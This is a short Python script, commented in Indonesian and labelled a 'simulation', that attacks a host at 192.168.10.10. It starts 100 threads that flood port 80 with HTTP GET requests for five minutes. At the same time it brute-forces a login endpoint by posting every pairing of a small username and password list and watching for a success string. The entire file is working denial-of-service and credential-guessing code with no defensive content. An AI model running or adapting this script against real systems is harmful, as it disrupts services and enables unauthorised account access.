import socket
import threading
import requests
from itertools import product
import time

# Konfigurasi Target
TARGET_IP = "192.168.10.10"
TARGET_PORT = 80  # Port HTTP untuk DDoS
TARGET_URL = "http://192.168.10.10"  # URL endpoint login untuk brute force
USERNAME_LIST = ["admin", "user", "test"]   # Daftar username
PASSWORD_LIST = ["1234", "password", "admin", "test"]  # Daftar password
DURATION = 300  # Durasi maksimum (5 menit)

# Catatan waktu mulai dan selesai
start_time = time.time()
end_time = start_time + DURATION

# Fungsi untuk DDoS
def ddos_attack():
    try:
        while time.time() < end_time:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((TARGET_IP, TARGET_PORT))
                message = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n"
                s.send(message.encode())
    except Exception as e:
        # Jika ada error, lanjutkan
        pass

# Fungsi untuk Brute Force
def brute_force():
    for username, password in product(USERNAME_LIST, PASSWORD_LIST):
        if time.time() > end_time:  # Hentikan jika waktu melebihi durasi
            print("Waktu habis, menghentikan brute force...")
            return

        # Data login yang akan dikirim
        data = {
            "username": username,
            "password": password
        }

        try:
            # Mengirimkan permintaan POST ke server
            response = requests.post(TARGET_URL, data=data)

            # Cek apakah login berhasil (asumsi: kode 200 dengan teks "Login sukses")
            if "Login sukses" in response.text:
                print(f"[+] Berhasil! Username: {username}, Password: {password}")
                return
            else:
                print(f"[-] Gagal. Username: {username}, Password: {password}")
        except requests.exceptions.RequestException as e:
            print(f"Kesalahan koneksi: {e}")
            return

# Menjalankan DDoS dan Brute Force secara paralel
if __name__ == "__main__":
    print("Memulai simulasi DDoS dan brute force...")

    # Thread untuk DDoS
    ddos_threads = []
    for _ in range(100):  # Jumlah thread untuk DDoS
        t = threading.Thread(target=ddos_attack)
        ddos_threads.append(t)
        t.start()

    # Thread untuk Brute Force
    brute_force_thread = threading.Thread(target=brute_force)
    brute_force_thread.start()

    # Menunggu semua thread selesai
    for t in ddos_threads:
        t.join()
    brute_force_thread.join()

    print("Simulasi selesai.")